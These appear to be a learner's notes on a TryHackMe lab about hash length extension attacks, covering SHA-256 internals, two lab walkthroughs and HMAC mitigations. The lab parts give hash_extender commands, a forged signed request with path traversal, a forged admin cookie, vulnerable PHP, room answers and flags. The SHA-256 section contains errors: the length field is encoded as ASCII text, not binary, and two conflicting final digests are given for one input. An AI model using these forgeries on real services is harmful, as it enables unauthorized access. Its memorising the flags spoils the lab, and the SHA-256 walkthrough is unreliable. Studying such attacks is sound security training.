
#Subscribers #hashes 
https://tryhackme.com/room/lengthextensionattacks

Hash functions are one of those tools that might seem hidden in the background but are incredibly important for protecting data. They take any amount of input (whether it's a tiny file or a huge one) and generate a fixed-length output that represents the data. It's like taking a fingerprint of the data: no matter how big or small it is, the output (the hash) will always be the same size.

Even the smallest change to the input will create a completely different hash. This makes hashes perfect for checking whether something has been tampered with. If the hash changes, you know the data isn't the same anymore.

## hash functions

### Key Properties That Make Hash Functions Secure

To see why hashes are so widely used in security, let's break down the key features:

- **Pre-image Resistance**: If someone sees the hash, they shouldn't be able to figure out what the original input was. This is critical for things like password storage, where even if an attacker gets their hands on a hash, they still can't reverse it to get the original password.
- **Second Pre-image Resistance**: If someone has both a message and its hash, it should be very difficult to find a different message that produces the same hash. This makes sure no one can tamper with the data and make it seem like everything is still intact.
- **Collision Resistance**: A hash function is designed so that it is computationally infeasible to find two different inputs that produce the same hash. While collisions (different inputs with the same hash) theoretically exist, the goal is to make it practically impossible for an attacker to identify such collisions within a reasonable time frame. Without collision resistance, the assurance of data integrity provided by hashes would be compromised.

### Where Are Hash Functions Used?

Hash functions are at work in more places than you might realize:

1. **File Integrity Checks**: When you download a file, like software or an update, you might notice that a hash is provided for you to verify the download. You compare the hash of the downloaded file with the one provided by the developer: if they match, the file hasn't been tampered with.
2. **Storing Passwords**: When you create a password, websites don't store it directly. Instead, they hash it and store the hash. When you try to log in, the system hashes the password you enter and checks if it matches the stored hash. This way, even if the password database is compromised, attackers don't get your actual password.
3. **Digital Signatures and Certificates**: Hashes ensure that documents or transactions haven't been altered. For example, in email encryption or SSL certificates, hash functions verify that data has remained unchanged and trustworthy.

### Vulnerabilities in Hash Functions

Even though hash functions are generally secure, not all of them are created equal. Older hash functions like **MD5** and **SHA-1** have known vulnerabilities that make them susceptible to attacks. One such attack is the **Length Extension Attack**, which allows an attacker to take an existing hash and extend it by adding a suffix, predicting the hash of the original message with extra data appended. Crucially, this can be done without needing to know the key used in the hash. Throughout this room, we'll see how this attack works and explore different scenarios where it can be exploited.

```
What property prevents an attacker from reversing a hash to get the original input?

Pre-image Resistance

What property ensures that no two different messages produce the same hash?

Collision Resistance

```

## Hashing internals 

### How Hash Functions Process Data

Hash functions like MD5, SHA-1, and SHA-256 don't process data all at once. Instead, they break it down into fixed-size chunks. For example, SHA-256 uses 512-bit blocks. If the data doesn't perfectly fit into these blocks, it gets padded. Padding is essential because it ensures that the data fits the exact block size needed for the hash function to do its job.

### Why Padding Matters

Padding isn't just filler: it serves two critical purposes:

1. **Data Alignment**: The data needs to be aligned to the exact block size (like 512 bits for SHA-256). So, if your message is shorter, padding fills up the remaining space.
2. **Message Integrity**: At the end of the padding, the length of the original message is added. This makes sure that any changes to the message can be detected later on.

Let's say you have a message that's 448 bits long. SHA-256 works with 512-bit blocks, so we need to pad the message to fill out the remaining 64 bits. You'd add a "1" bit followed by 63 "0" bits to make the message a full 512 bits. After that, the length of the original message is added to the final 64 bits of the last block.

In simple terms, it will be: 448 + 1(1 bit) + 63(0 bits) = 512 Bits

So if the message is exactly 448 bits, it fits into one block. The block includes the message, a "1" bit, and 63 bits for padding, including the 64-bit length at the end. If the message plus padding exceeds the block size, a new block is added for the length encoding.

### How Hash Functions Use States

Once the data is padded, the hash function processes it block by block, updating its internal state each time. This internal state is a collection of fixed-size values (called registers) that store intermediate results. Each time a block is processed, the hash function tweaks these values, working through rounds of transformations (like bitwise operations and additions) until all the data has been processed.

For example, **SHA-256** has 8 words (A, B, C, D, E, F, G, H) in its internal state, and these values get updated each time a block is processed. The idea is to scramble the data so thoroughly that even a tiny change in the input will completely change the final hash.

### Breakdown of Popular Hash Functions

Let's take a closer look at some popular hash functions and how they work:

#### MD5

- **Block size**: 512 bits
- **Internal state**: 128 bits, split into 4 registers (A, B, C, D)
- **Rounds**: MD5 processes each block of data through 64 rounds of operations, which involve things like addition, bitwise shifts, and XOR (exclusive OR) operations.

![[Pasted image 20250211105904.png]]
**Why it's vulnerable**: MD5's internal state and padding are predictable, making it vulnerable to attacks like length extension, where an attacker can append data to a message and still generate a valid hash. This hash function is also obsolete for security-sensitive applications due to collision vulnerabilities.

#### SHA-1

- **Block size**: 512 bits
- **Internal state**: 160 bits, split into 5 words (A, B, C, D, E)
- **Rounds**: SHA-1 processes each block through 80 rounds of transformations, much like MD5, but with more complexity.

![[Pasted image 20250211110348.png]] 
**Why it's vulnerable**: SHA-1 has been proven to have weaknesses in its ability to prevent collisions, and like MD5, it's vulnerable to length extension attacks. This is why it's considered outdated for modern security. Similarly to MD5, this hash function is also obsolete for security-sensitive _applications_ due to collision vulnerabilities.

#### SHA-256

- **Block size**: 512 bits
- **Internal state**: 256 bits, split into 8 words (A, B, C, D, E, F, G, H)
- **Rounds**: SHA-256 processes each block through 64 rounds of operations, updating its state with bitwise shifts, rotations, and additions.

![[Pasted image 20250211110454.png]]
**Why it's better but not perfect**: SHA-256 is much stronger than MD5 and SHA-1, but it's still vulnerable to length extension attacks if used incorrectly: especially if it's used without a secret key (like in HMAC).

### How Padding and State Manipulation Work

To make this more concrete, imagine you're hashing the message "TryHackMe." The message gets padded until it fits into a 512-bit block. Then, the hash function initializes its internal state and starts crunching through the data, block by block. With each block processed, the internal state gets updated through multiple rounds of operations. By the end of the process, you get a hash that represents the entire input, with even the smallest changes in the message completely altering the final result.

#### SHA-256 Hashing Process

```
padding process: TryHackMe0000000
L initial state setup: TryH ackM e000 0000
L hash computation => GR9M
L final has generation = GR9M
```

Before hashing begins, the input message must be structured correctly to meet the **512-bit block size requirement** of SHA-256.

**Padding Process**

- The input message, **"TryHackMe"**, is displayed in block letters.
- SHA-256 operates on **512-bit chunks**, but "TryHackMe" is too short. To meet this requirement, **extra data is added** at the end of the message.
- The animation shows **a total of 16 blocks**, but since "TryHackMe" only fills 9 of them, the last 7 blocks are padded with zeros.
- This ensures that the message length meets SHA-256’s processing rules before further transformations occur.

**Initial State Setup**

- The padded message is broken down into **smaller segments** for further processing.
- The animation above visually splits the message into **four distinct blocks**, each containing four characters. This segmentation allows SHA-256 to efficiently process the data step by step rather than working on the entire message at once.

**Hash Computation**

- SHA-256 applies a series of mathematical operations to transform the message.
- The four blocks are merged and processed using bitwise operations and modular arithmetic. The animation represents this transformation with a new **intermediate block labeled "GR9M"**, symbolizing that the original message has already started changing through computations.

**Final Hash Generation**

- The final transformation produces a **fixed-length 256-bit hash**.
- The animation shows the last computed block emerging as the final hash output, illustrating that the input message has been completely transformed.

SHA-256 processes data in **512-bit blocks**, meaning that any input message must be **expanded** to fit this exact size. Each character in **"TryHackMe"** is converted into its **8-bit ASCII binary equivalent**:

```
character       ASCII           binary 
--------------------------------------------------------------
T               84              01010100
r               114             01110010
y               121             01111001
H               72              01001000
a               97              01100001
c               99              01100011
k               107             01101011
M               77              01001101
e               101             01100101
```

Once all characters are converted, the resulting **binary string is 72 bits long**:

```
01010100 01110010 01111001 01001000 01100001 01100011 01101011 01001101 01100101
```

Since SHA-256 **requires 512 bits**, we must **extend** this binary string using **padding rules**. SHA-256 requires 512-bit blocks; we must extend the **72-bit message**. Padding is applied in three steps:

**1. Append a 1 Bit**

- A **single `1-bit`** is added to indicate the end of the actual message.
- The new length is now **73 bits**.  **Updated binary string:**

```
01010100 01110010 01111001 01001000 01100001 01100011 01101011 01001101 01100101 1
```

**2. Add `375` Zeros**

- SHA-256 requires that **padding fill the message up to 448 bits** (leaving space for the length field).
- Since we now have **73 bits**, we add **375 zeros** to bring the total length to **448 bits**.

```
01010100 01110010 01111001 01001000 01100001 01100011 01101011 01001101 01100101 1 00000000...00000000
```

**3. Append the Message Length (64 Bits)**

- The **original message length (72 bits)** is converted into a **64-bit binary representation**.
- The 72-bit message length in decimal is `72`, which converts to **`00110110 00110100`** in binary.
- This **64-bit length representation** is **appended to the message**.
Final **512-bit** message:

```markdown
01010100 01110010 01111001 01001000 01100001 01100011 01101011 01001101 01100101 1 00000000...00000000 00110110 00110100
```

Now that the message is **exactly 512 bits**, it is **forwarded to the Initial State Setup Block** for further processing.

SHA-256 doesn’t process the entire 512-bit message at once; instead, it **breaks it down into smaller 32-bit blocks** and then **expands it further** into a 64-block structure. This step is crucial because it ensures that the message undergoes proper diffusion, allowing even small changes in input to have a significant impact on the final hash.

**1. Breaking Down the 512-bit Message**

The animation above starts by displaying the **padded 512-bit message from Animation 2** as one long sequence of binary values. However, since SHA-256 processes **32-bit words**, this sequence must be divided into smaller units.

To illustrate this, the animation **draws a red line**, visually **splitting the 512-bit message into 16 smaller blocks**, each containing **32 bits**. These blocks are labeled sequentially as **W[0] to W[15]**.

At this stage, the message still consists of only **16 blocks**, but SHA-256 requires **64 blocks** for processing. This means the existing blocks must be **expanded using a specific formula** to fill in the missing values from **W[16] to W[63]**.

**2. Expanding the Message: Computing W[16]**

To explain how new blocks are created, the animation zooms into a **single example calculation**: the creation of **W[16]**.

To the right of `W[16]`, the animation highlights four specific blocks from earlier in the sequence:

- `W[14]`
- `W[9]`
- `W[1]`
- `W[0]`

These blocks are used to compute `W[16]` using the following formula:

```
W[16] = σ1(W[14]) + W[9] + σ0(W[1]) + W[0]
```

Each term in this equation is computed step by step:

```
1. Computing σ1(W[14])
	W[14] undergoes bitwise operations
	rotated right by 17 bits
	rotated right by 19 bits
	shifted right by 10 bits
	result is XOR'd together

2. adding W[9]
	retrieves its value and adds it to the running sum

3. computing σ0(W[1])
	bitwise rotation and shift operation for W[1]
	rotate right by 7, then 18 bits
	shift right by 3 bits
	results are XOR'd 

4. adding W[0]

Once all values are combined, W[16] with the final computed value.
```

**3. Completing the Expansion to W[63]**

With `W[16]` computed, the animation zooms back out and **fast-forwards through the calculations** for the remaining blocks up to `W[63]`. These are filled sequentially using the same logic applied to `W[16]`, ensuring the entire **message schedule** is complete.

By the end of this step, all **64 blocks** (`W[0]` to `W[63]`) are generated, forming the **fully expanded message schedule** that will be used in the next phase of hashing.

**4. Introducing the Initial Hash Values (`H0` to `H7`)**

SHA-256 requires **starting hash values** that act as the foundation for all computations. These values are **predefined constants**, derived from the **first 32 bits of the fractional parts of the square roots of the first eight prime numbers**.

The animation above displays these **eight initial hash values** in separate labeled boxes:

- `H0 = 6a09e667`
- `H1 = bb67ae85`
- `H2 = 3c6ef372`
- `H3 = a54ff53a`
- `H4 = 510e527f`
- `H5 = 9b05688c`
- `H6 = 1f83d9ab`
- `H7 = 5be0cd19`

Each of these **32-bit blocks** is assigned to a corresponding **working variable** (`a, b, c, d, e, f, g, h`).

**5. Assigning Initial Hash Values to Working Variables**

To prepare for the next phase of computation, the animation **visually connects each hash value to its corresponding working variable**:

- `H0` is assigned to `a`.
- `H1` is assigned to `b`.
- `H2` is assigned to `c`.
- `H3` is assigned to `d`.
- `H4` is assigned to `e`.
- `H5` is assigned to `f`.
- `H6` is assigned to `g`.
- `H7` is assigned to `h`.

These working variables will be used in the **hash computation phase**, where they will be modified over 64 rounds of processing.

At this stage in SHA-256, the **message has been expanded to 64 blocks** and the **initial hash values** have been set up. Now, the hashing function enters the **main computation phase**, where the message undergoes **64 rounds of processing**.

Each round applies a **series of mathematical transformations** to mix the message further and introduce diffusion, ensuring that **even a small change in input produces a completely different hash**.

This animation **zooms into the Hash Computation block** and walks through a **single round** in full detail before **fast-forwarding the remaining 63 rounds**.

**1. Initialize the Hash Computation Process**

The animation above begins with the following **inputs**:

1. **The 64 message blocks** (`W[0]` to `W[63]`) generated in Animation 3.
2. **The eight working variables** (`a, b, c, d, e, f, g, h`), which are initialized from the predefined hash values (`H0` to `H7`).

At the start of the first round, these values remain **unchanged from their initial states**.

**2. Processing a Single Round**

Since SHA-256 consists of **64 rounds**, the animation **focuses on the first round** to explain the step-by-step process before fast-forwarding the remaining rounds.

- The animation **highlights `W[0]`**, the **first message block**, as it is introduced into the computation.
- At the same time, **the round constant `K[0]`** is displayed.
- These values are used in calculations that modify the working variables.

Each round has a unique round constant (`K[i]`), which is a **predefined 32-bit value** derived from the fractional parts of the cube roots of the first 64 prime numbers.

**For the first round:**

```markdown
K[0] = 0x428a2f98
```

SHA-256 uses **two logical functions**, **Ch** and **Maj**, which help in mixing the data by selectively choosing and combining bits.

##### Ch Function (Choice Function)

```
takes 3 inputs: e, f, g

Ch(e, f, g) = (e AND f) XOR (NOT e AND g)

e decides which bits from f and g will be chosen
if a bit in e=1 the corresponding bit from f is used
if a but in e=0 the corresponding bit from g is used
XOR operation combines the selected bits
```

##### Maj Function (Majority Function)

```
takes 3 inputs: a, b, c

Maj(a, b, c) = (a AND b) XOR (a AND c) XOR (b AND c)

selects the majority bit value among a,b,c
if at least two out of three bits are 1, the result is 1
If at least two out of three bits are 0, the result is 0

These functions help ensure that bitwise patterns spread throughout the computation.

SHA-256 applies two **sigma functions**, which introduce non-linearity through bitwise rotations and shifts.
```

##### Σ1 Function (Applied to `e`)

```
Σ1(e) = ROTR(e, 6) XOR ROTR(e, 11) XOR ROTR(e, 25)

bits in e 
rotate right 6 bits, by 11 bits, by 25 bits
then XOR'd

computed values are combined into 2 temp values

Temp1 = h + Σ1(e) + Ch + K[i] + W[i]
Temp2 = Σ0(a) + Maj

the intermediate sum for Temp1
the intermediate sum for Temp2 is calculated separately.

These values will be used to update the working variables. 
After computing `Temp1` and `Temp2`, the values of the working variables (`a` to `h`) are updated as follows:

h = g
g = f
f = e
e = d + Temp1
d = c
c = b
b = a
a = Temp1 + Temp2

shift the values
at the end of round 1 the values of a to h gave changed , marking 1 step of diffusion
```

**3. Repeat the Computation for 64 Rounds**

- After **one full round**, the animation **fast-forwards through the remaining 63 rounds**.
- The values continue updating, spreading the message bits throughout the system.

**4. Update the Initial Hash Values (`H0` to `H7`)**

Once all **64 rounds** are completed, the final values of `a` to `h` are **added to the original hash values**:

```markdown
H0 = H0 + a
H1 = H1 + b
H2 = H2 + c
H3 = H3 + d
H4 = H4 + e
H5 = H5 + f
H6 = H6 + g
H7 = H7 + h
```

- The animation **adds the new values to the original hash values**.
- The result is **a new set of hash values**, which will be **used as the final hash**.

At this stage, the SHA-256 algorithm has completed **64 rounds of computation**, and the working variables (`a` to `h`) have been **updated and modified** in every round. However, these variables alone are not the final hash yet.

The final step in the SHA-256 process is to **combine the modified values of `a` to `h` into a single 256-bit output hash**. This step is known as **Final Hash Generation**, where we take the **updated working variables, merge them, and present them as a fixed-length output**.

**1. Retrieve the Updated Hash Values (`H0` to `H7`)**

From **Animation 4**, we know that after the **64 rounds**, the **final values of the working variables (`a` to `h`)** were added to their respective **initial hash values (`H0` to `H7`)**.

These updated values now serve as the **final hash values** that will be combined to form the SHA-256 digest.

For the input **"TryHackMe"**, the final computed values are:

```markdown
H0 = 9e897fb7
H1 = e8832e7d
H2 = 6e5f63a4
H3 = bdbd0cd6
H4 = 496f53cb
H5 = 3f54b5ab
H6 = f84217d9
H7 = f4ca5397
```

The animation above starts by **displaying each of these values separately**, emphasizing that they are **the final results of all previous computations**.

**2. Concatenating the Eight Hash Values Into a 256-bit Block**

SHA-256 produces a **256-bit output**, which is formed by **joining the eight final hash values (`H0` to `H7`)**.

Since each `H` value is **32 bits long**, concatenating them results in:

```markdown
H0 + H1 + H2 + H3 + H4 + H5 + H6 + H7 = 256-bit final hash
```

  
To visually demonstrate this process, the animation does the following:

1. **Displays the eight hash values (`H0` to `H7`) in sequence**.
2. **Moves them toward each other**, merging them into a single **long binary block**.
3. **Shows the combined 256-bit binary representation**.

**3. Converting the Concatenated Binary Block to Hexadecimal**

Internally, SHA-256 operates on **binary values**, but the final output is typically displayed in **hexadecimal format** for readability.

To illustrate this, the animation **highlights each `H` value in its binary form**, then shows:

1. **The conversion of each 32-bit binary block into its hexadecimal equivalent**.
2. **The final hash as a concatenated hexadecimal string**.

The final SHA-256 digest for **"TryHackMe"** is:

```markdown
9e897fb7e8832e7d6e5f63a4bdbd0cd6496f53cb3f54b5abf84217d9f4ca5397
```

At this point, the animation clearly shows that the **binary representation of `H0` to `H7` is now merged into a readable hexadecimal hash**.

**4. Displaying the Final Hash as Output**

Now that the final SHA-256 hash is computed:

```markdown
f4616fd825a10ded9af58fbaee09f3e31751d15591f9323ea68b03a0e8ac3783
```

This final **fixed-length, irreversible cryptographic fingerprint** represents the original input **"TryHackMe"** in a hashed format.

```
What block size does SHA-256 use?

512

What function ensures data is aligned to fit block size requirements?

padding

How many words does SHA-256’s internal state have?

8

```

## length extension attacks

A **Length Extension Attack** takes advantage of how certain hash functions process data. Specifically, it works on hash functions like **MD5**, **SHA-1**, and **SHA-256**, which are built using something called the **Merkle-Damgård construction**. These hash functions let an attacker take an existing hash and add extra data onto the message that the hash represents without even needing to know the original message or the secret key used to create it. This works because these hash functions process data in chunks or blocks, with each block's hash influencing the next block's processing. If an attacker knows the final hash, they can use it as the starting state to hash additional blocks of data, effectively extending the original message and predicting what the new hash would be.

### How Does It Work?

For a length extension attack to be possible, the attacker needs a few things: they must have the **hash** of the original message, they need to know the **length** of the original message (or be able to guess it), and they need to **understand how the padding rules work** for that specific hash function.

Hash functions process data in blocks, updating an internal state after each block is processed. When an attacker knows the final hash, this hash represents the internal state of the algorithm after all blocks of the original message have been processed. By using this internal state, an attacker can continue the hashing process, adding new blocks of data to create a predictable hash for the extended message, all without knowing the original message itself.

### Visualizing the Attack

Here's an easy way to picture it: under normal circumstances, a message gets hashed, and you get a digest (the final hash). The process ends there. But in a length extension attack, the attacker takes that final hash, appends more data, and continues the hashing process. As a result, they generate a new, valid hash without needing to know the original input or key.

```
normal hashing                   length extension attack
----------------------------------------------------------------
message: "user=test              original: "user=test"
padding is added to block size   attacker adds "&admin=true"
hash generated                   attacker uses hash, makes new hash
results in valid hash            predictable hash modified (no key)
```

### Why Does This Work?

This attack works because of how the internal state of the hash function is carried over between data blocks. After processing the original message, the hash function leaves off in a specific internal state (represented by the hash). The attacker can take that state, add more data, and keep going. The function doesn't "finalize" the process after the original message, so it can be tricked into continuing the hashing with the new data.

### Vulnerable Hash Functions

Many commonly used hash functions are vulnerable to length extension attacks, especially those based on the Merkle-Damgård construction:

- **MD5**: Once popular but now considered weak due to vulnerabilities like length extension attacks. MD5 processes data in 512-bit blocks, making it an easy target for these attacks.
- **SHA-1**: Like MD5, SHA-1 uses block-by-block processing and suffers from similar weaknesses. It has been phased out of most security-critical systems because of these vulnerabilities.
- **SHA-256**: While stronger than MD5 and SHA-1, SHA-256 can still be exploited in a length extension attack if used without additional protections like HMAC (a key-based hashing method).

```
What hashing method prevents length extension attacks by using a secret key?

HMAC
```

## practical attacking signatures

In this task, you'll learn how a length extension attack can be used to append data while still generating a valid signature. This approach takes advantage of hash functions like SHA-256, which are vulnerable to length extension attacks when used improperly.

> [!info]  it is recommended 
> to use AttackBox and install the [hash_extender](https://github.com/iagox86/hash_extender) tool. 
> The tool is located at `/root/Rooms/LengthExtensionAttacks/hash_extender/`.

Navigate to [http://lea.thm/labs/lab1/](http://lea.thm/labs/lab1/).

Click the View Details button on any product listed on the homepage. As you can see on the next page, the `product.php` uses the signature parameter together with the file parameter to check the legitimacy of the filename supplied in the file parameter.
```
http://lea.thm/labs/lab1/product.php?file=1.png&signature= <string>
```

vulnerable code
The PHP code below uses a SHA-256 hash to sign file names for the vulnerable application. This signature is meant to verify that only authorized files (images for products) can be accessed, preventing unauthorized file access.

```php
require_once("secrets.php");

function sign($str, $secret) {
    return hash('sha256', $secret . $str);
}

// Retrieve and sanitize file and signature parameters
$file = isset($_GET['file']) ? $_GET['file'] : '';
$signature = isset($_GET['signature']) ? $_GET['signature'] : '';

if ($file && $signature) {
    // Validate the signature
    if (sign($file, $SECRET) === $signature) {

        // Sanitize the filename, force UTF-8 encoding, and remove malicious characters
        $file = mb_convert_encoding($file, 'UTF-8', 'binary');
        $file = preg_replace('/[^\w\/.]/', '', $file);

        // Set the file path in the images folder
        $filePath = __DIR__ . "/images/" . basename($file);

        // Check if the file exists and if it matches a defined product
        if (file_exists($filePath)) {
            $product = $products[$file];
						// Display product details
```

Here's how the vulnerable code works:

1. The server generates a **SHA-256 hash** by signing the file name with a secret key.
2. It then validates the **file** and **signature** parameters from a GET request to ensure the request is authentic.
3. If the signature matches, the server retrieves and displays product details.

### Objective

The objective here is to append additional data (`/../4.png`) to the `file` parameter (e.g., `"1.png"`) to access an unauthorized file while generating a valid SHA-256 signature for the modified file path.

To achieve this, we'll use **Hash Extender** to modify the original file path and create a new signature. The tool is publicly available on [GitHub](https://github.com/iagox86/hash_extender). The command below illustrates how to carry out the attack:

```
~/Rooms/LengthExtensionAttacks/hash_extender# ./hash_extender --data 1.png --signature 02d101c0ac898f9e69b7d6ec1f84a7f0d784e59bbbe057acb4cef2cf93621ba9 --append /../4.png --out-data-format=html

--data           original data to be signed "1.png"
--signature      original hash signature for "1.png"   
--append         adds new data to be appended "/../4.png"

```

> [!info] Note 
> that in some cases, the secret length varies depending on the secret phrase used by the server. Hence, sometimes, it is important to brute force the signature by using an incrementing secret length.

With this new signature, we can send a forged request to access `"4.png"` instead of `"1.png"`. The request might look like this:

```
GET /product.php?file=1%2epng%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00h%2f%2e%2e%2f4%2epng&signature=a9f7878a39b10d0a9d3d1765d3e83dd34b0b0242fa7e1567f085a5a9c467337a
```
The server, trusting the signature, will validate the hash and grant access to `"4.png"` because the new signature matches the appended path.

```
http://lea.thm/labs/lab1/product.php?file=1.png&signature=02d101c0ac898f9e69b7d6ec1f84a7f0d784e59bbbe057acb4cef2cf93621ba9

./hash_extender --data 1.png --signature 02d101c0ac898f9e69b7d6ec1f84a7f0d784e59bbbe057acb4cef2cf93621ba9 --append /../4.png --out-data-format=html

Type: sha256
Secret length: 8
New signature: a9f7878a39b10d0a9d3d1765d3e83dd34b0b0242fa7e1567f085a5a9c467337a
New string: 1%2epng%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00h%2f%2e%2e%2f4%2epng

Type: sm3
Secret length: 8
New signature: b3503f8697adb6906472c4115b8732ceed307217e19b808bdb94795c2021fca6
New string: 1%2epng%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00h%2f%2e%2e%2f4%2epng

1.png&signature=02d101c0ac898f9e69b7d6ec1f84a7f0d784e59bbbe057acb4cef2cf93621ba9

THM{L3n6th_3Xt33ns10nssss}

```

## practical: modify signed cookie 

The application hosted at [http://lea.thm/labs/lab2/](http://lea.thm/labs/lab2/) uses cookies to store information such as session token and authentication hash. 

```
Login page    user : user 
browser > inspect > Application > Cookies
```

To prevent tampering, it signs the cookies named **auth** with a SHA-256 hash based on a secret key. However, since SHA-256 is vulnerable to length extension attacks, we can potentially alter the cookie's content while keeping the signature valid, allowing us to gain unauthorized access.

Here's the vulnerable code that verifies the authenticity of the cookie:

```php
require_once("secrets.php");

// Default authorization status
$auth = false;

// Check if the 'auth' and 'hsh' cookies are set
if (isset($_COOKIE["auth"]) && isset($_COOKIE["hsh"])) {
    $auth = $_COOKIE["auth"]; // Get the original auth string
    $hsh = $_COOKIE["hsh"];

    // Verify the hash to ensure integrity
    if ($hsh === hash("sha256", $SECRET . $auth)) {
        // Instead of trying to parse, check if 'role=1' exists in the string
        if (strpos($auth, 'role=1') !== false) {
            echo "<html><head><title>Admin Panel</title></head><body>";
            echo "<h1>Welcome, Admin!</h1><br><br>";
        } elseif (strpos($auth, 'role=0') !== false) {
            echo "<html><head><title>User Panel</title></head><body>";
            echo "<h1>Welcome, User!</h1><br><br>";
        }
    }
}
```

In this setup:

- The `auth` cookie contains user data like `"username=user;role=0"` to indicate a regular user.
- The `hsh` cookie is the SHA-256 hash signature generated using the secret key combined with the `auth` data.
- The server checks if `role=1` exists in `auth` to grant admin access.

As an attacker, our goal is to escalate privileges by changing `role=0` to `role=1` in the `auth` cookie, effectively gaining admin access without knowing the secret key. To achieve this,  again we'll use **Hash Extender** to perform a length extension attack.

### Modifying the Cookie

The `hash_extender` tool can be used to generate a modified cookie value that includes `role=1` and provides a new valid signature.

```
./hash_extender --data 'username=user;role=0' --append ';role=1' --signature bfe0fa5c36531773c73dcc8d2a931301f69cf9add05a1f35dcfa2d48b44c37f0 --format sha256 --secret 8 --out-data-format=html
```

**Explanation**:
- `--data` is the original cookie value (`username=user;role=0`).
- `--append` specifies the data we want to add (`;role=1`).
- `--signature` is the original SHA-256 hash signature for `username=user;role=0`.
- `--format` specifies the hash algorithm (SHA-256).
- `--secret` is the guessed length of the secret key (in this case, `8`).

The `hash_extender` output provides us with:
- A **new signature** for the modified cookie.
- A **new auth string** that includes the appended `;role=1`.

```plaintext
auth=username%3duser%3brole%3d0%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%3brole%3d1
hsh=daf3dbdc47fd93fabe110ef0ed58a39d1eb59c234a7fd66d0fe2e1dd76f1e37f

paste in the browser cookie sections > reload page

THM{l3n6th_2_4dM1n}

Auth:
HSH: daf3dbdc47fd93fabe110ef0ed58a39d1eb59c234a7fd66d0fe2e1dd76f1e37f
```

After setting these cookies and refreshing the page, the server will recognize the modified cookie as valid and provide admin-level access because the server reads `role=1` in the `auth` string.

## mitigating techniques 

While length extension attacks can pose a serious risk to systems that rely on vulnerable hash functions, there are straightforward ways to protect against them.

### Preventing Length Extension Attacks

**Use HMAC (Hash-based Message Authentication Code)**

One of the best ways to stop length extension attacks is to use **HMAC**. HMAC is designed to prevent attacks by combining a hash function with a **secret key**. It ensures that attackers can't simply append data to a message and still create a valid hash without knowing the secret key.

Why does HMAC work so well?

- The secret key is mixed with the data before the hash is generated, so an attacker who tries to add extra data will not be able to calculate the correct hash without the key.
- Since the key is required to generate the hash, this process prevents length extension attacks entirely.

Here's a quick example of how you can implement HMAC in Python with SHA-256:

```python
import hmac
import hashlib

key = b'supersecretkey'
message = b'important_data'

hmac_hash = hmac.new(key, message, hashlib.sha256).hexdigest()
print(hmac_hash)
```

With HMAC in place, even if someone tries to mess with your message, they won't be able to produce a valid hash without the secret key.

**Stop Using Outdated Hash Functions**

Hash functions like **MD5** and **SHA-1** have been known to have vulnerabilities for years. These are no longer safe for any security-sensitive applications, including integrity checks or signing data. Instead, you should use more modern alternatives like **SHA-3**, and ideally, always use them with HMAC to ensure added protection.

**Use Established Security Protocols**

Rather than trying to build your own cryptographic solutions, it's better to rely on protocols that are already proven secure. For example, **OAuth** and **JWT (JSON Web Tokens)** use secure mechanisms to sign and verify data. **JWTs** signed with **HMAC-SHA256** are resistant to length extension attacks because the secret key is needed to validate the token.

